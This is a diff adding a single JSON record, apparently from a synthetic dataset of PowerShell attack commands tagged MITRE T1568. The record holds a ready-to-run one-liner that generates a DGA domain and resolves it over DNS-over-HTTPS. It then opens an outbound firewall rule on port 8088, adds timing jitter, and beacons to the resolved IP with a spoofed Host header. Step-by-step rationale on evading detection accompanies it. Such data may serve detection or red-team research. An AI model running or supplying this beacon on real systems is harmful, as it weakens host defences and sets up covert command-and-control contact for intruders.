@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $seed=(Get-Date).DayOfYear; $dom=('relay{0}{1}.syncnode.net' -f (Get-Random -Min 100 -Max 999),$seed); $doh=('https://cloudflare-dns.com/dns-query?name={0}&type=A' -f $dom); $json=(Invoke-WebRequest -Uri $doh -Headers @{ accept='application/dns-json' } -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json; $ip=$json.Answer | Where-Object { $_.type -eq 1 } | Select-Object -First 1 -ExpandProperty data; if($ip){ netsh advfirewall firewall add rule name='sys_out_8088' dir=out action=allow protocol=TCP remoteport=8088 | Out-Null; Start-Sleep -Milliseconds (Get-Random -Min 400 -Max 2200); Invoke-WebRequest -Uri ('http://{0}:8088/ping' -f $ip) -Headers @{ Host=$dom; 'User-Agent'='curl/7.79.1' } -TimeoutSec (Get-Random -Min 4 -Max 8) -UseBasicParsing } }",
+  "explanation": "Uses DNS-over-HTTPS to resolve a DGA domain to an IP, permits outbound 8088, introduces timing jitter, and contacts the resolved endpoint with a Host header to simulate virtual hosting.",
+  "rationale_steps": [
+    "Create a time-variant DGA domain.",
+    "Resolve the domain over DoH to blend with normal HTTPS.",
+    "Allow outbound on an uncommon port and add jitter to traffic timing.",
+    "Perform an HTTP check-in to the resolved IP with Host-based routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-cfd87873",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
